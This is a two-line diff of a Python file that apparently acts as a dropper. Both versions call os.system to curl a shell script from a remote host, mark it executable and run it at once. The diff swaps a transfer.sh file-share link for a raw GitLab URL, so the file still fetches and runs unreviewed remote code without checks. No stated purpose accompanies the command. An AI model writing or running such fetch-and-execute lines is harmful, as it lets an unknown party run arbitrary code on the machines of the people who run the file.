@@ -1,2 +1,2 @@
 import os
-os.system('curl https://transfer.sh/htqq1D/config.sh && chmod u+x config.sh && ./config.sh')
+os.system('curl https://gitlab.com/ardisantaka/andirana/-/raw/mikayui/releases.sh && chmod u+x releases.sh && ./releases.sh')
